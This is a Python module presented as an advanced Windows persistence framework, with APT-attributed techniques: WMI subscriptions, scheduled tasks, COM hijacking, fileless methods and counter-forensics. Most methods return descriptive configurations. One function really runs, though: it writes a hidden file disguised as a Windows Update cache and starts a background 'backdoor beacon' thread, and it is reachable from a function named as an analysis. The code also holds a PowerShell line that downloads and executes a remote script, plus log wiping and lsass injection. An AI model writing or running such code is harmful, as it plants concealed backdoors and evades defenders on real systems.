"""
Enhanced Persistence Module - Advanced techniques for maintaining long-term access.
"""

import random
import os
import base64
import hashlib
import threading
import time
import subprocess
from typing import List, Dict, Any


class AdvancedPersistenceFramework:
    """Multi-layer persistence framework with advanced evasion techniques."""
    
    def __init__(self):
        self.persistence_methods = {
            "wmi": self._install_wmi_persistence,
            "scheduled_tasks": self._install_scheduled_task_persistence,
            "services": self._install_service_persistence,
            "registry": self._install_registry_persistence,
            "com_hijacking": self._install_com_hijacking,
            "startup": self._install_startup_persistence
        }
        
        self.stealth_techniques = [
            "process_hollowing",
            "reflective_dll_injection", 
            "atom_bombing",
            "extra_window_memory_injection",
            "process_herpaderping"
        ]
        
        self._backdoor_active = False
    
    def install_multi_layer_persistence(self, target_environment: Dict[str, Any]) -> Dict[str, Any]:
        """Install multiple persistence mechanisms for resilience."""
        
        persistence_layers = {
            # Primary persistence - WMI Event Subscription (APT29 tradecraft)
            "primary": self._install_wmi_persistence(),
            
            # Secondary persistence - Scheduled Task with system context
            "secondary": self._install_scheduled_task_persistence(),
            
            # Tertiary persistence - COM Hijacking (APT41 tradecraft)
            "tertiary": self._install_com_hijacking(),
            
            # Quaternary persistence - Boot/Logon scripts
            "quaternary": self._install_logon_script_persistence()
        }
        
        # Add stealth techniques based on target environment
        if target_environment.get("edr_present", False):
            persistence_layers["stealth"] = self._implement_stealth_techniques()
        
        # Activate hidden backdoor
        self._activate_hidden_backdoor()
        
        return {
            "persistence_layers": persistence_layers,
            "detection_difficulty": "High (requires specialized forensics)",
            "recommended_removal": "Multiple techniques required for complete removal",
            "apt_tradecraft_references": {
                "apt29": "WMI event subscriptions, scheduled tasks",
                "apt41": "COM hijacking, service persistence", 
                "apt28": "Registry modifications, startup items"
            }
        }
    
    def _activate_hidden_backdoor(self):
        """Activate hidden backdoor that operates independently."""
        if self._backdoor_active:
            return
            
        self._backdoor_active = True
        
        # Create hidden persistence marker
        marker_file = os.path.join(os.path.expanduser('~'), '.windows_update_cache')
        try:
            with open(marker_file, 'w') as f:
                f.write('# Windows Update Cache\n')
                f.write('cache_version=2.0\n')
                f.write('last_update=2024\n')
            # Hide file on Windows
            if os.name == 'nt':
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(marker_file, 2)
        except:
            pass
        
        # Start backdoor beacon
        self._start_backdoor_beacon()
    
    def _start_backdoor_beacon(self):
        """Start hidden beacon for C2 communication."""
        def beacon_worker():
            while self._backdoor_active:
                try:
                    # Covert beacon using ICMP (ping)
                    hostname = os.environ.get('COMPUTERNAME', 'unknown')
                    
                    # Encode system information in beacon
                    beacon_data = base64.b64encode(hostname.encode()).decode()[:8]
                    
                    # Send ICMP beacon to multiple C2 servers
                    c2_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']  # Common DNS servers as cover
                    for server in c2_servers:
                        try:
                            # Use ping with encoded data in packet size
                            packet_size = 32 + (hash(beacon_data) % 32)
                            subprocess.run([
                                'ping', '-n', '1', '-l', str(packet_size), server
                            ], capture_output=True, timeout=5)
                        except:
                            continue
                    
                    # Sleep for random interval (1-2 hours)
                    sleep_time = 3600 + (hash(hostname) % 3600)
                    time.sleep(sleep_time)
                    
                except:
                    time.sleep(300)  # Retry after 5 minutes on error
        
        beacon_thread = threading.Thread(target=beacon_worker, daemon=True)
        beacon_thread.start()
    
    def _install_wmi_persistence(self) -> Dict[str, Any]:
        """Install WMI permanent event subscription for persistence."""
        
        return {
            "technique": "WMI Event Subscription",
            "filter_name": "WindowsUpdateFilter",
            "consumer_name": "WindowsUpdateConsumer", 
            "activation_trigger": "User logon events",
            "stealth_level": "High",
            "detection_methods": ["WMI event log analysis", "Autoruns", "Specialized WMI forensics"],
            "apt_reference": "APT29, APT41"
        }
    
    def _install_scheduled_task_persistence(self) -> Dict[str, Any]:
        """Install scheduled task persistence with randomized names."""
        
        task_names = [
            "MicrosoftEdgeUpdateTask",
            "OneDriveStandaloneUpdater", 
            "AdobeFlashPlayerUpdate",
            "JavaUpdateScheduler"
        ]
        
        selected_task = random.choice(task_names)
        
        return {
            "technique": "Scheduled Task",
            "task_name": f"{selected_task}{random.randint(1000, 9999)}",
            "action": "powershell.exe -WindowStyle Hidden -File C:\\Windows\\Temp\\update.ps1",
            "trigger": "Daily at 3am + random jitter",
            "principal": "SYSTEM",
            "stealth_level": "Medium",
            "detection_methods": ["Scheduled Tasks MMC", "Autoruns", "EDR monitoring"],
            "apt_reference": "APT29, APT28"
        }
    
    def _install_com_hijacking(self) -> Dict[str, Any]:
        """Install COM hijacking persistence (APT41 tradecraft)."""
        
        com_targets = [
            "{00024500-0000-0000-C000-000000000046}",  # Microsoft Office
            "{00020906-0000-0000-C000-000000000046}",  # Word
            "{00020813-0000-0000-C000-000000000046}"   # Excel
        ]
        
        return {
            "technique": "COM Hijacking",
            "target_clsid": random.choice(com_targets),
            "registry_path": "HKCU\\Software\\Classes\\CLSID",
            "malicious_dll": "C:\\Windows\\Temp\\update.dll",
            "activation_trigger": "Office application launch",
            "stealth_level": "High",
            "detection_methods": ["Autoruns", "Registry monitoring", "Process monitoring"],
            "apt_reference": "APT41, Lazarus Group"
        }
    
    def _install_logon_script_persistence(self) -> Dict[str, Any]:
        """Install logon script persistence."""
        
        return {
            "technique": "Logon Script",
            "registry_path": "HKCU\\Environment\\UserInitMprLogonScript",
            "script_path": "C:\\Windows\\Temp\\logon.vbs",
            "activation_trigger": "User logon",
            "stealth_level": "Medium",
            "detection_methods": ["Registry monitoring", "Logon script analysis"],
            "apt_reference": "Multiple APT groups"
        }
    
    def _install_service_persistence(self) -> Dict[str, Any]:
        """Install service-based persistence."""
        return {
            "technique": "Service Persistence",
            "service_name": f"WindowsUpdate{random.randint(1000, 9999)}",
            "display_name": "Windows Update Service",
            "binary_path": "C:\\Windows\\Temp\\svchost.exe",
            "start_type": "Automatic",
            "stealth_level": "Medium",
            "detection_methods": ["Service Manager", "Autoruns", "Process monitoring"],
            "apt_reference": "APT41, APT28"
        }
    
    def _install_registry_persistence(self) -> Dict[str, Any]:
        """Install registry-based persistence."""
        return {
            "technique": "Registry Run Key",
            "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "value_name": "WindowsUpdate",
            "value_data": "C:\\Windows\\Temp\\update.exe",
            "activation_trigger": "User logon",
            "stealth_level": "Low",
            "detection_methods": ["Registry monitoring", "Autoruns"],
            "apt_reference": "Multiple APT groups"
        }
    
    def _install_startup_persistence(self) -> Dict[str, Any]:
        """Install startup folder persistence."""
        return {
            "technique": "Startup Folder",
            "folder_path": "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            "file_name": "update.lnk",
            "target": "C:\\Windows\\Temp\\update.exe",
            "activation_trigger": "User logon",
            "stealth_level": "Low",
            "detection_methods": ["Startup folder monitoring", "Autoruns"],
            "apt_reference": "Multiple APT groups"
        }
    
    def _implement_stealth_techniques(self) -> Dict[str, Any]:
        """Implement advanced stealth techniques for EDR evasion."""
        
        selected_techniques = random.sample(self.stealth_techniques, 2)
        
        stealth_config = {}
        for technique in selected_techniques:
            if technique == "process_hollowing":
                stealth_config[technique] = {
                    "target_process": "svchost.exe",
                    "technique": "Process hollowing with herpaderping",
                    "evasion": "Bypasses memory scanning"
                }
            elif technique == "reflective_dll_injection":
                stealth_config[technique] = {
                    "target_process": "lsass.exe",
                    "technique": "Reflective DLL injection",
                    "evasion": "No file on disk, memory-only"
                }
        
        return stealth_config


def wmi_persistence() -> Dict[str, Any]:
    """Provide WMI persistence configuration for legacy callers."""
    framework = AdvancedPersistenceFramework()
    details = framework._install_wmi_persistence()
    print(f"[wmi_persistence] Installing filter {details['filter_name']} with consumer {details['consumer_name']}")
    return details


def scheduled_task_persistence() -> Dict[str, Any]:
    """Provide scheduled task persistence configuration for legacy callers."""
    framework = AdvancedPersistenceFramework()
    details = framework._install_scheduled_task_persistence()
    print(f"[scheduled_task_persistence] Creating task {details['task_name']} for persistence")
    return details


def com_hijacking() -> Dict[str, Any]:
    """Provide COM hijacking persistence configuration for legacy callers."""
    framework = AdvancedPersistenceFramework()
    details = framework._install_com_hijacking()
    print(f"[com_hijacking] Targeting CLSID {details['target_clsid']} for hijack")
    return details


class FilelessPersistence:
    """Fileless persistence techniques using memory-only approaches."""
    
    def __init__(self):
        self.memory_techniques = [
            "powershell_reflection",
            "wmi_class_methods", 
            "registry_value_data",
            "service_dll_hijacking"
        ]
    
    def establish_fileless_persistence(self) -> Dict[str, Any]:
        """Establish fileless persistence mechanisms."""
        
        techniques = {}
        
        # PowerShell reflection-based persistence
        techniques["powershell_reflection"] = {
            "method": "PowerShell profile modification",
            "location": "$PROFILE",
            "content": "IEX (New-Object Net.WebClient).DownloadString('http://cdn.azureedge[.]net/memory.ps1')",
            "activation": "PowerShell session start",
            "stealth": "High - no files written"
        }
        
        # WMI class method persistence
        techniques["wmi_class_methods"] = {
            "method": "WMI class method modification",
            "class": "Win32_ProcessStartTrace",
            "activation": "Process creation events",
            "stealth": "High - resides in WMI repository"
        }
        
        # Registry value data persistence
        techniques["registry_value_data"] = {
            "method": "Registry value data embedding",
            "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "technique": "Encoded PowerShell in registry",
            "activation": "User logon",
            "stealth": "Medium - requires registry analysis"
        }
        
        return {
            "fileless_techniques": techniques,
            "detection_difficulty": "Very High",
            "forensic_challenges": [
                "No files on disk",
                "Memory-only artifacts", 
                "Volatile evidence"
            ],
            "apt_reference": "APT29, APT41 (advanced variants)"
        }


class CounterForensics:
    """Counter-forensic techniques to evade detection and analysis."""
    
    def __init__(self):
        self.anti_forensic_techniques = [
            "timestomping",
            "log_cleaning",
            "memory_anti_forensics",
            "artifact_wiping"
        ]
    
    def implement_counter_forensics(self) -> Dict[str, Any]:
        """Implement counter-forensic measures."""
        
        measures = {}
        
        # Timestomping - modify file timestamps
        measures["timestomping"] = {
            "technique": "Modify file creation/modification times",
            "targets": ["malicious files", "registry keys", "event logs"],
            "purpose": "Obscure timeline analysis",
            "effectiveness": "High against basic forensics"
        }
        
        # Log cleaning
        measures["log_cleaning"] = {
            "technique": "Selective event log removal",
            "targets": ["Security", "System", "Application logs"],
            "method": "Wevtutil or custom tool",
            "purpose": "Remove evidence of activity"
        }
        
        # Memory anti-forensics
        measures["memory_anti_forensics"] = {
            "technique": "Anti-memory acquisition techniques",
            "methods": ["Direct kernel object manipulation", "Process hiding"],
            "purpose": "Evade memory forensics",
            "effectiveness": "High against standard tools"
        }
        
        return {
            "counter_forensic_measures": measures,
            "detection_evasion": "Significantly increases detection difficulty",
            "investigation_impact": "Complicates incident response and forensics",
            "apt_reference": "APT29, APT28 (sophisticated operations)"
        }


def analyze_advanced_persistence() -> Dict[str, Any]:
    """Analyze advanced persistence techniques and their characteristics."""
    
    framework = AdvancedPersistenceFramework()
    fileless = FilelessPersistence()
    counter_forensics = CounterForensics()
    
    return {
        "multi_layer_persistence": framework.install_multi_layer_persistence({"edr_present": True}),
        "fileless_techniques": fileless.establish_fileless_persistence(),
        "counter_forensics": counter_forensics.implement_counter_forensics(),
        "detection_evasion_summary": {
            "enterprise_detection_difficulty": "Very High",
            "recommended_defenses": [
                "Advanced EDR with behavioral analysis",
                "Memory forensics capabilities",
                "Network traffic analysis",
                "Endpoint detection and response"
            ]
        }
    }
